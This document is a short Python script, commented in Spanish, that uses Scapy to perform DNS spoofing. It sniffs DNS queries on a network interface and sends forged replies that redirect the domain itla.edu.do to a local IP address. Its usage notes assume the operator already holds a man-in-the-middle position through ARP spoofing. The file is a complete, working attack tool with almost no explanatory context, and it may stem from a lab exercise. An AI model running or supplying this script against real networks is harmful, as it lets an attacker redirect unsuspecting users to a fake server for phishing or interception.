#!/usr/bin/env python3
"""
DNS Spoofing - Responde con IP falsa a consultas de itla.edu.do
Requisitos: Scapy, estar en posicion de MITM (ARP spoofing previo o mismo segmento)
Uso: sudo python3 dns_spoof.py
"""
from scapy.all import *

interfaz = "eth1"
dominio_objetivo = "itla.edu.do."
ip_falsa = "192.168.1.100"   # IP de tu servidor web local

def spoof_dns(pkt):
    if pkt.haslayer(DNSQR) and pkt[DNSQR].qname.decode().lower() == dominio_objetivo.lower():
        print(f"[+] Interceptada consulta DNS para {pkt[DNSQR].qname.decode()}")

        ip_resp = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        udp_resp = UDP(dport=pkt[UDP].sport, sport=53)
        dns_resp = DNS(
            id=pkt[DNS].id,
            qr=1, aa=1, qd=pkt[DNS].qd,
            an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=ip_falsa)
        )

        spoofed_pkt = ip_resp / udp_resp / dns_resp
        send(spoofed_pkt, iface=interfaz, verbose=False)
        print(f"[+] Respuesta falsa enviada: {dominio_objetivo} -> {ip_falsa}")

print(f"[*] Escuchando consultas DNS para '{dominio_objetivo}' en {interfaz}...")
print(f"[*] Redirigiendo hacia: {ip_falsa}")
sniff(iface=interfaz, filter="udp port 53", prn=spoof_dns, store=0)
